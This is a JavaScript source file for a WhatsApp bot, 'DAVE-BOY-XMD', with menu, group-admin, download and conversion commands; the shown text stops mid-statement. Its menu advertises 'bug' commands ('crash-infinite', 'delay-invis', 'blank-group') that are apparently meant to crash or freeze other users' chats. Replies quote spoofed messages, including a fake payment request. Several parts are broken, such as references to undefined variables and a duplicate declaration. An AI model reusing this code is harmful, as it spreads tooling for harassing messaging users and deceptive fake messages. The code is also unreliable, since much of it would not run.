/*
> Recode script give credits to›
Giddy Tennor

📝 | Created By DAWENS BOY
🖥️ | Base Ori By DAVE TECH 
📝 | Created By DAWENS TECH
📌 |Credits DAVE BOY 
📱 |Chat wa:13058962443
👑 |Github: dawens8 
✉️ |Email: berryxoe@gmail.com
*/
require('./configure')
const {
    default: baileys,
    proto,
    jidNormalizedUser,
    generateWAMessage,
    generateWAMessageFromContent,
    getContentType,
    prepareWAMessageMedia,
} = require("@whiskeysockets/baileys");

const os = require('os')
const fs = require('fs')
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const { color } = require('./list/lib/color')
const chalk = require('chalk')
const moment = require('moment-timezone')
const cron = require('node-cron')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const yts = require('yt-search')
const ytdl= require ('ytdl-core')
const gis = require('g-i-s')
const cheerio = require('cheerio')
const { randomBytes } = require('crypto')
const fg = require('api-dylux')
const googleTTS = require('google-tts-api')

const {translate} = require('@vitalets/google-translate-api')
const scp2 = require('./list/lib/scrape2') 

const absenData = {};
const { temporary, temmp } = require('./list/tempor')
const basepic = fs.readFileSync('./Media/basepic.jpg')
const {
    exec,
    spawn,
    execSync
} = require("child_process")
const {
    performance
} = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const {
    TelegraPh,
    UploadFileUgu,
    webp2mp4File,
    floNime
} = require('./list/lib/uploader')
const {
addPremiumUser,
getPremiumExpired,
getPremiumPosition,
expiredPremiumCheck,
checkPremiumUser,
getAllPremiumUser,
} = require('./list/lib/premiun')
const {
    toAudio,
    toPTT,
    toVideo,
    ffmpeg,
    addExifAvatar
} = require('./list/lib/converter')
const {
    smsg,
    getGroupAdmins,
    formatp,
    formatDate,
    getTime,
    isUrl,
    await,
    tanggal,
    telegraPh,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    runtime,
    fetchJson,
    getBuffer,
    json,
    delay,
    toIDR,
    capital,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    pickRandom,
    fetchBuffer,
    buffergif,
    GroupDB,
    kickQueue,
    totalcase
} = require('./list/lib/func')
const orgkaya = fs.readFileSync('./list/Database/premium.json')   
const owner = JSON.parse(fs.readFileSync('./list/Database/owner.json'))
const isPremium = owner || owner|| checkPremiumUser(m.sender, orgkaya);
global.db.data = JSON.parse(fs.readFileSync('./list/Database/database.json'))
if (global.db.data) global.db.data = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db.data || {})
}

let vote = db.data.others.vote = []
let kuismath = db.data.game.math = []
const xtime = moment.tz('Africa/Nairobi').format('HH:mm:ss')
const xdate = moment.tz('Africa/Nairobi').format('DD/MM/YYYY')
const time2 = moment().tz('Africa/Nairobi').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var tennortimewisher = `Good Night mofo🌌`
 }
 if(time2 < "19:00:00"){
var tennortimewisher = `Good Evening mofo🌃`
 }
 if(time2 < "18:00:00"){
var tennortimewisher = `Good Evening mofo🌃`
 }
 if(time2 < "15:00:00"){
var tennortimewisher = `Good Afternoon mofo🌅`
 }
 if(time2 < "11:00:00"){
var tennortimewisher = `Good Morning mofo 🌄`
 }
 if(time2 < "05:00:00"){
var tennortimewisher = `Good Morning mofo🌄`
 } 
const time = moment().tz("Africa/Nairobi").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃 Early Morning"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄GoodMorning"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️GoodAfternoon"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️Goodevening"
} else {
    ucapanWaktu = "🌆Goodnight"
};
//function
const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
function capitaler(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}
//module
module.exports = bot = async (bot, m, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
        //prefix 1
        var prefix = ['+', '/',','] ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : xprefix
        const isCmd = body.startsWith(prefix, '')
        const isCmd2 = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const command2 = body.slice(1).trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await bot.decodeJid(bot.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        //media
const bugres = 'Sending bug process....'      
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isDocument = (type == 'documentMessage')
        const isLocation = (type == 'locationMessage')
        const isContact = (type == 'contactMessage')
        const isSticker = (type == 'stickerMessage')
        const isText = (type == 'textMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
       //prefix 2
        const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : xprefix
        const xeonybody = body.startsWith(pric)
        const isCommand = xeonybody ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase() : ""
        const sticker = []
       //group
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await bot.groupMetadata(m.chat).catch(e => {}) : ''
        
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
const Media = m.mtype
        //user status
const xeonverifieduser = fs.readFileSync('./list/Database/user.json')

        const isUser = xeonverifieduser.includes(sender)
        const Owner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium= Owner || checkPremiumUser(m.sender, orgkaya)
        expiredPremiumCheck(bot, m, orgkaya)
async function sendbotMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await bot.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
if (global.autoRecording) {
        bot.sendPresenceUpdate('recording', from)
        }      
      if (global.autoTyping) {
        bot.sendPresenceUpdate('composing', from)
        }
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']
        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
        bot.sendPresenceUpdate(xeonrecordinfinal, from)

        }
 const groupName = isGroup ? groupMetadata.subject : "";      
if (m.message) {
    if (isCmd && !m.isGroup) {
        console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)));
        console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 New Message! 🚀`)))
        console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}`
     )
   )
);
    } else if (m.isGroup) {
        console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)));
        console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 New Message! 🚀`)));
        console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}
🔍 MESS LOCATION: ${groupName}`
       ))
     );
  }
}

const loli = {
  key: {
    fromMe: false,
    participant: "13058962443@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: bot,
      itemCount: "9741",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const mdmodes = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "13058962543@s.whatsapp.net"
} : {}),
id: `${Date.now()}-${Math.random().toString(36).slice(2)}`
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `𝐃𝐀𝐕𝐄 𝐁𝐎𝐘`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
},
status: 1,
  participant: "0@s.whatsapp.net"
}
//Reply function//
async function reply(teks) {
bot.sendMessage(m.chat, {
text: teks,
contextInfo: {
forwardingScore: 9,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363419768812867@newsletter",
newsletterName: "© DAVE-BOY-XMD - 2025"
}
}
}, {
quoted: m
})
}
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
            var v16 = m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : m.mtype === "conversation" ? m.message.conversation : m.mtype == "imageMessage" ? m.message.imageMessage.caption : m.mtype == "videoMessage" ? m.message.videoMessage.caption : m.mtype == "extendedTextMessage" ? m.message.extendedTextMessage.text : m.mtype == "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId : m.mtype == "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId : m.mtype == "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId : m.mtype == "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "";
         const v18 = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(v16) ? v16.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : ".";
        const v20 = v16.replace(v18, "").trim().split(/ +/).shift().toLowerCase();
       const v51 = ["✅"];    
        const v52 = v51[Math.floor(Math.random() * v51.length)];
    const vF4 = p11 => {
      return bot.sendMessage(m.chat, {
        react: {
          text: p11,
          key: m.key
        }
      });
    };
        async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
        
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: bot.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, bot.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
bot.ev.emit('messages.upsert', msg)
}
penis = fs.readFileSync("./base.js").toString(),
matches = penis.match(/case '[^']+'(?!.*case '[^']+')/g) || [],
caseCount = matches.length,
caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);

let totalCases = caseCount,
listCases = caseNames.join('\n⭔ ');
//Command area(only case)
switch (isCommand) {
case 'starter': 
case 'menu': {
await bot.sendMessage(from, {react: {text: "💧", key: m.key}}); await sleep(10)
let allmenu = tennortimewisher + ` *@${sender.split("@")[0]}* 👋🏻
┏❐  ⌜ DAVE-BOY-XMD ⌟  ❐
┃⭔ Creator :DAVE TECH 
┃⭔ Version : 1.0.0 
┃⭔ Type : Case
┃⭔ Status : Ready
┃⭔ Mode : ${bot.public ? '✱ Public ༣' : '✲ Self ༣'}
┃⭔ User : ${Object.keys(db.data.users).length}
┃⭔ Prefix : Single
┃⭔ Total commands :${totalCases}
┗❐
❐${prefix}ownermenu
❐${prefix}settingmenu
❐${prefix}cpanelmenu
❐${prefix}othermenu
❐${prefix}status
❐${prefix}totalcase
❐${prefix}ping
`
 await bot.sendMessage(m.chat, {  
            image: basepic,  
            caption: allmenu,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "𝐌𝐮𝐥𝐭𝐢 𝐃𝐞𝐯𝐢𝐜𝐞 𝐁𝐨𝐭",
                    newsletterJid: `120363418618707597@newsletter` 
                },
                isForwarded: true,
               externalAdReply: {
                   showAdAttribution: true,
                   title: `𝐍𝐞𝐰 𝐃𝐀𝐕𝐄-𝐁𝐎𝐘-𝐗𝐌𝐃`,
                   mediaType: 3,
                   renderLargerThumbnail: false,
                   thumbnailUrl: 'https://img12.pixhost.to/images/855/575167528_skyzopedia.jpg',
                   sourceUrl: ``
                }
            }
        },{ quoted: mdmodes }
     ),
       await bot.sendMessage(m.chat, { 
           audio: { url: 'https://files.catbox.moe/h2fg3w.mp4' },
           mimetype: 'audio/mp4', 
           ptt: true 
       },{ quoted: loli }
     );
}
 break;
//==================================================//
case 'starterowner': 
case 'ownermenu': {
await bot.sendMessage(from, {react: {text: "💧", key: m.key}}); await sleep(10)
let allmenu = tennortimewisher + ` *@${sender.split("@")[0]}* 👋🏻
┏❐  ⌜ DAVE-BOY-XMD ⌟  ❐
┃⭔ Creator :DAWENS BOY 
┃⭔ Version : 1.0.0 
┃⭔ Type : Case
┃⭔ Status : Ready
┃⭔ Mode : ${bot.public ? '✱ Public ༣' : '✲ Self ༣'}
┃⭔ User : ${Object.keys(db.data.users).length}
┃⭔ Prefix : Single 
┃⭔ Total commands :${totalCases}
┗❐
❐${prefix}self
❐${prefix}public 
❐${prefix}addprem 
❐${prefix}delprem
`
 await bot.sendMessage(m.chat, {  
            image: basepic,  
            caption: allmenu,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "𝐌𝐮𝐥𝐭𝐢 𝐃𝐞𝐯𝐢𝐜𝐞 𝐁𝐨𝐭",
                    newsletterJid: `120363419768812867@newsletter` 
                },
                isForwarded: true,
               externalAdReply: {
                   showAdAttribution: true,
                   title: `𝐍𝐞𝐰 𝐃𝐀𝐕𝐄-𝐁𝐎𝐘-𝐗𝐌𝐃`,
                   mediaType: 3,
                   renderLargerThumbnail: false,
                   thumbnailUrl: 'https://img12.pixhost.to/images/855/575167528_skyzopedia.jpg',
                   sourceUrl: ``
                }
            }
        },{ quoted: mdmodes }
     ),
       await bot.sendMessage(m.chat, { 
           audio: { url: 'https://files.catbox.moe/azu9wc.mp4' },
           mimetype: 'audio/mp4', 
           ptt: true 
       },{ quoted: loli }
     );
}
 break;
//==================================================//
case 'status': {
let os = require('os')
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())

reply(`
┏❐  ⌜ DAVE-BOY-XMD ⌟  ❐
┃⭔ Creator :GOD TOKYO
┃⭔ Type : Case
┃⭔ Status : Maintenance 
┃⭔ Mode : ${bot.public ? '✱ Public ༣' : '✲ Self ༣'}
┃⭔ User : ${Object.keys(db.data.users).length}
┃⭔ Prefix : Single 
┃⭔ Resp Speed : ${latensi.toFixed(4)}
┃⭔ Ram : ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
┃⭔ Runtime : ${run}
┗❐

❐ Total Commands:${totalCases}

`)
}
break
           
//==================================================//
case 'settingmenu': 
case 'settings': {
await bot.sendMessage(from, {react: {text: "💧", key: m.key}}); await sleep(10)
let allmenu = tennortimewisher + ` *@${sender.split("@")[0]}* 👋🏻
┏❐  ⌜ DAVE-BOY-XMD ⌟  ❐
┃⭔ Creator :GOD LEY 
┃⭔ Version : 1.0.0 
┃⭔ Type : Case
┃⭔ Status : Ready
┃⭔ Mode : ${bot.public ? '✱ Public ༣' : '✲ Self ༣'}
┃⭔ User : ${Object.keys(db.data.users).length}
┃⭔ Prefix : Single
┃⭔ Total commands :${totalCases}
┗❐
❐${prefix}autotype 
❐${prefix}autorecordtype 
❐${prefix}setpp
❐${prefix}delpp
❐${prefix}setbio
`
 await bot.sendMessage(m.chat, {  
            image: basepic,  
            caption: allmenu,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "𝐌𝐮𝐥𝐭𝐢 𝐃𝐞𝐯𝐢𝐜𝐞 𝐁𝐨𝐭",
                    newsletterJid: `120363419768812867@newsletter` 
                },
                isForwarded: true,
               externalAdReply: {
                   showAdAttribution: true,
                   title: `𝐍𝐞𝐰 𝐃𝐀𝐕𝐄-𝐁𝐎𝐘-𝐗𝐌𝐃`,
                   mediaType: 3,
                   renderLargerThumbnail: false,
                   thumbnailUrl: 'https://img12.pixhost.to/images/855/575167528_skyzopedia.jpg',
                   sourceUrl: ``
                }
            }
        },{ quoted: mdmodes }
     ),
       await bot.sendMessage(m.chat, { 
           audio: { url: 'https://files.catbox.moe/qsx9gk.mp4' },
           mimetype: 'audio/mp4', 
           ptt: true 
       },{ quoted: loli }
     );
}
 break;
//==================================================//
case 'others': 
case 'othermenu': {
await bot.sendMessage(from, {react: {text: "💧", key: m.key}}); await sleep(10)
let allmenu = tennortimewisher + ` *@${sender.split("@")[0]}* 👋🏻
┏❐  ⌜ DAVE-BOY-XMD ⌟  ❐
┃⭔ Creator :GOD MKE 
┃⭔ Version : 1.0.0 
┃⭔ Type : Case
┃⭔ Status : Ready
┃⭔ Mode : ${bot.public ? '✱ Public ༣' : '✲ Self ༣'}
┃⭔ User : ${Object.keys(db.data.users).length}
┃⭔ Prefix : Single
┃⭔ Total commands :${totalCases}
┗❐
       [𝐆𝐑𝐎𝐔𝐏]
❐${prefix}kick
❐${prefix}add
❐${prefix}kill 
❐${prefix}promote 
❐${prefix}demote
❐${prefix}open 
❐${prefix}close
❐${prefix}hidetag
❐${prefix}tagall 
❐${prefix}approve
❐${prefix}reject

       [𝐃𝐎𝐖𝐋𝐎𝐀𝐃]
❐${prefix}play
❐${prefix}tt
❐${prefix}igdl
❐${prefix}fb
❐${prefix}yts
❐${prefix}lyrics 

       [𝐂𝐎𝐍𝐕𝐄𝐑𝐒𝐈𝐎𝐍]
❐${prefix}toptv
❐${prefix}sticker
❐${prefix}pretem
❐${prefix}fancy
❐${prefix}toimage
❐${prefix}tovideo
❐${prefix}toaudio

        [𝐂𝐎𝐋𝐋𝐄𝐂𝐓𝐈𝐎𝐍]
❐${prefix}getname
❐${prefix}getpp
❐${prefix}getname
❐${prefix}listblock
❐${prefix}listpc

       [𝐁𝐔𝐆𝐒]
❐${prefix}delay-invis
❐${prefix}crash-infinite
❐${prefix}blank-group 
`
 await bot.sendMessage(m.chat, {  
            image: basepic,  
            caption: allmenu,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "𝐌𝐮𝐥𝐭𝐢 𝐃𝐞𝐯𝐢𝐜𝐞 𝐁𝐨𝐭",
                    newsletterJid: `120363419768812867@newsletter` 
                },
                isForwarded: true,
               externalAdReply: {
                   showAdAttribution: true,
                   title: `𝐍𝐞𝐰 𝐃𝐀𝐕𝐄-𝐁𝐎𝐘-𝐗𝐌𝐃`,
                   mediaType: 3,
                   renderLargerThumbnail: false,
                   thumbnailUrl: 'https://img12.pixhost.to/images/855/575167528_skyzopedia.jpg',
                   sourceUrl: ``
                }
            }
        },{ quoted: mdmodes }
     ),
       await bot.sendMessage(m.chat, { 
           audio: { url: 'https://files.catbox.moe/3gtjtb.mp4' },
           mimetype: 'audio/mp4', 
           ptt: true 
       },{ quoted: loli }
     );
}
 break;
//==================================================//        
        case 'starterpanel': 
case 'cpanelmenu': {
await bot.sendMessage(from, {react: {text: "💧", key: m.key}}); await sleep(10)
let allmenu = tennortimewisher + ` *@${sender.split("@")[0]}* 👋🏻
┏❐  ⌜ DAVE-BOY-XMD ⌟  ❐
┃⭔ Creator :DIVISION GOD 4TH 
┃⭔ Version : 1.0.0 
┃⭔ Type : Case
┃⭔ Status : Ready
┃⭔ Mode : ${bot.public ? '✱ Public ༣' : '✲ Self ༣'}
┃⭔ User : ${Object.keys(db.data.users).length}
┃⭔ Prefix : Single 
┗❐
❐${prefix}1gb
❐${prefix}2gb
❐${prefix}3gb
❐${prefix}4gb
❐${prefix}5gb
❐${prefix}6gb
❐${prefix}7gb
❐${prefix}8gb
❐${prefix}9gb
❐${prefix}10gb
❐${prefix}unli
`
 await bot.sendMessage(m.chat, {  
            image: basepic,  
            caption: allmenu,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "𝐌𝐮𝐥𝐭𝐢 𝐃𝐞𝐯𝐢𝐜𝐞 𝐁𝐨𝐭",
                    newsletterJid: `120363419768812867@newsletter` 
                },
                isForwarded: true,
               externalAdReply: {
                   showAdAttribution: true,
                   title: `𝐍𝐞𝐰 𝐃𝐀𝐕𝐄-𝐁𝐎𝐘-𝐗𝐌𝐃`,
                   mediaType: 3,
                   renderLargerThumbnail: false,
                   thumbnailUrl: 'https://img12.pixhost.to/images/855/575167528_skyzopedia.jpg',
                   sourceUrl: ``
                }
            }
        },{ quoted: mdmodes }
     ),
       await bot.sendMessage(m.chat, { 
           audio: { url: 'https://files.catbox.moe/7lufyc.mp4' },
           mimetype: 'audio/mp4', 
           ptt: true 
       },{ quoted: loli }
     );
}
 break;
//==================================================//
        case 'ping':
                          case 'p':
                            {
                              
                                   async function loading (jid) {
                             
                                    let start = new Date;
                                    let { key } = await bot.sendMessage(jid, {text: 'warte..'})
                                    let done = new Date - start;
                                    var lod = `*Pong*:\n> ⏱️ ${done}ms (${Math.round(done / 100) / 10}s)`
                                    
                                    await sleep(1000)
                                    await bot.sendMessage(jid, {text: lod, edit: key });
                                    }
                                    loading(from)
                                   
                            }       
                            break;
        //==================================================//
        case 'public': {
if (!Owner) return reply(mess.owner)
bot.public = true
reply('Sukses changed to public mode')
}
break

case 'self': {
if (!Owner) return reply(mess.owner)
bot.public = false
reply('Success changed to self mode')
}
break
       //==================================================//
case 'kick': {
if (!isGroup) return reply(mess.group)
if (!isBotAdmins) return reply("bot must be admin first")
if (!Owner) return reply(mess.owner)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await bot.groupParticipantsUpdate(m.chat, [users], 'remove')
reply(`Sukses kick @${users.split('@')[0]}`)
}
break
//==================================================//              
        case "open": {
if (!isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply("bot must be admin first")
if (!Owner) return m.reply(mess.owner)
await bot.groupSettingUpdate(m.chat, 'not_announcement')
reply("Success opened group chat,all members can send messages in group now")
}
break
//==================================================//          
case "close": {
if (!isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply("bot must be admin first")
if (!Owner) return m.reply(mess.owner)
await bot.groupSettingUpdate(m.chat, 'announcement')
reply("Success closed group chat,all members are not allowed to chat for now")
}
break
//==================================================//              
        case 'listpc': {
if (!Owner) return reply(mess.owner);
let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `*Private Chat*\nTotal: ${anulistp.length} Chat\n\n`
for (let i of anulistp) {
let nama = store.messages[i].array[0].pushName
teks += `*Name :* ${pushname}\n*User :* @${sender.split('@')[0]}\n*Chat :* https://wa.me/${sender.split('@')[0]}\n\n───────────\n\n`
}
reply(teks)
}
break
//==================================================//      
        case 'add': {
if (!isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.group)
if (!Owner) return reply(mess.owner)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await bot.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
//==================================================//           
        case 'reject': case 'reject-all': {
	if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins) return m.reply(mess.group)
if (!isBotAdmins) return m.reply("bot must be admin idiot")

const responseList = await bot.groupRequestParticipantsList(m.chat);

if (responseList.length === 0) return m.reply("no pending requests detected");

for (const participan of responseList) {
    const response = await bot.groupRequestParticipantsUpdate(
        m.chat, 
        [participan.jid], // Approve/reject each participant individually
        "reject" // or "reject"
    );
    console.log(response);
}
m.reply("pending requests have been rejected!");

}
 break;
//==================================================//                             
                case 'approve': case 'approve-all': {
	if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins) return m.reply(mess.group)
if (!isBotAdmins) return m.reply("bot must be admin idiot")

const responseList = await bot.groupRequestParticipantsList(m.chat);

if (responseList.length === 0) return m.reply("no pending requests detected at the moment!");

for (const participan of responseList) {
    const response = await bot.groupRequestParticipantsUpdate(
        m.chat, 
        [participan.jid], // Approve/reject each participant individually
        "approve" // or "reject"
    );
    console.log(response);
}
m.reply("DAWENS has approved all pending requests✅");

}
 break;
//==================================================//      
case 'h':
case 'hidetag': {
if (!isGroup) return reply(mess.group)
if (!Owner) return reply(mess.owner)
if (m.quoted) {
bot.sendMessage(m.chat, {
forward: m.quoted.fakeObj,
mentions: participants.map(a => a.id)
})
}
if (!m.quoted) {
bot.sendMessage(m.chat, {
text: q ? q : '',
mentions: participants.map(a => a.id)
}, {
quoted: m
})
}
}
break
//==================================================//            
        case 'style': case 'fancy': {
if (!text) return reply('Enter Query text!')
let anu = await styletext(q)
let teks = `Style Text From ${q}\n\n`
for (let i of anu) {
teks += ` ${i.name}* : ${i.result}\n\n`
}
reply(teks)
}
break
 //==================================================//      
        case 'tagall': {
if (!isGroup) return reply(mess.group)
if (!Owner) return reply(mess.owner)
if (!text) return reply("woi")
bot.sendMessage(m.chat, {
text: "@" + m.chat,
contextInfo: {
mentionedJid: (await (await bot.groupMetadata(m.chat)).participants).map(a => a.id),
groupMentions: [
{
groupJid: m.chat,
groupSubject: text
}
]
}
}, {
quoted: m
})
}
break
//==================================================//      
        case "promote": case "promot": {
if (!isGroup) return m.reply(`for group only`)
if (!isAdmins && !Owner) return m.reply(`Command reserved for group admins only`)
if (!isBotAdmins) return m.reply(`bot is not an admin idiot`)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await bot.groupParticipantsUpdate(m.chat, [target], 'promote').then((res) => m.reply(`User ${target.split("@")[0]} is now an admin`)).catch((err) => m.reply(err.toString()))
} else return m.reply('Example: 254XXX/@tag')}
break  
//==================================================//              
        case "totalcase": {
penis = fs.readFileSync("./base.js").toString(),
matches = penis.match(/case '[^']+'(?!.*case '[^']+')/g) || [],
